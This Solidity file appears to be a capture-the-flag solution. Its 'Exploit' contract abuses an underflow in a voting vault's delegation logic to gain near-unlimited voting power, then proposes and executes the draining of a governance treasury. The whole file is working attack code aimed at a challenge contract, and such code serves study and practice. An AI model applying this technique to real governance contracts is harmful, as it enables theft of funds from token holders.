// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import { Setup } from "./Setup.sol";

contract Exploit {
    Setup setup;
    uint256 proposalId;

    constructor(Setup _setup) {
        setup = _setup;
    }

    // Execute this first
    function solvePart1() external {
        // Claim 1000 GREY
        setup.claim();

        // Lock 1 GREY in the voting vault 10 times
        setup.grey().approve(address(setup.vault()), 10);
        for (uint256 i = 0; i < 10; i++) setup.vault().lock(1);

        // Current voting power is 10
        assert(setup.vault().votingPower(address(this), block.number) == 10);

        // Delegate to another address
        setup.vault().delegate(address(1));

        // Voting power is 10 - 13, which underflows to 2^224 - 3
        assert(setup.vault().votingPower(address(this), block.number) == type(uint224).max - 2);

        // Create proposal to drain GREY from the treasury
        proposalId = setup.treasury().propose(
            address(setup.grey()), 
            setup.grey().balanceOf(address(setup.treasury())),
            msg.sender
        );
    }

    // Execute this in the next block after solvePart1()
    function solvePart2() external {
        // Vote for the malicious proposal and execute it
        setup.treasury().vote(proposalId);
        setup.treasury().execute(proposalId);
    }
}